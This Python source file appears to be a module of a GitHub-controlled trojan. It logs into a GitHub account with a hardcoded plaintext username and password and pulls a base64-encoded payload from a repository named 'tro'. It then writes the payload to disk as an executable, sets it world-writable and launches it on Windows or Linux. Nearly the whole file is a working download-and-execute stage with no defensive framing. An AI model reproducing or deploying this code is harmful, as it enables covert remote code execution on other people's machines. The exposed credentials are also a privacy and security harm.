from github3 import login
import json
import base64
import os

filePath = "bin/test" #"modules/dirlister.py" #
folder = filePath.rstrip("test")
#WinfilePath = "bin/test.exe"
encodedFiles  = False
bin = True
start = True
scriptExec = "python "

def connect_to_github():
	gh = login(username="MarvenGarsalli",password="1'mfor1am")
	repo = gh.repository("MarvenGarsalli","tro")
	branch = repo.branch("master")
	return gh,repo,branch

def get_file_contents(filepath):
        try:
                gh,repo,branch = connect_to_github()
                tree = branch.commit.commit.tree.to_tree().recurse()
                for filename in tree.tree:
                        if filepath in filename.path:
                                print("[OK] Found file %s" % filepath)
                                blob = repo.blob(filename._json_data['sha']) #Hashed content
                                if encodedFiles:
                                        return base64.b64decode(blob.content)
                                return blob.content
        except:
                print("exception raised!")
        return None


def run(**args): # Must import its personal lib, git_tro will execute this module in # environment
        print("[*] In getFileFromGit module.") #Todelete
        script	= get_file_contents(filePath)
        ch = ""
        if script is not None:
                content	= base64.b64decode(script)
                print(folder)
                try:
                        os.makedirs(folder, mode=777)
                except:
                        os.system("echo 'getRunScript: folder %s exists' >> Tapalog.log"%folder)
                if bin:
                        fich = open(filePath+".exe", "wb")
                        fich.write(content)
                        fich.close()
                        if start and os.name == 'nt':
                                os.system("start {}".format(filePath.replace('/','\\')))
                        elif start and os.name == 'posix':
                                os.system("chmod 777 {}".format(filePath))
                                os.system("./{}".format(filePath))
                        else:
                                os.system("echo 'Non-recognized OS' >> Tapalog.log")
                else:
                        fich = open(filePath, "w")
                        fich.write(content.decode())
                        fich.close()
                        os.system(scriptExec+" "+filePath)
                ch = str("getRunScript: file {} successfully started".format(filePath))
        else:
                #TODO: Customize log file path
                #os.system("echo 'getRunScript: Unable to find file {}' >> Tapalog.log".format(filePath))
                ch = str("getRunScript: Unable to find script {}".format(filePath))
        return ch

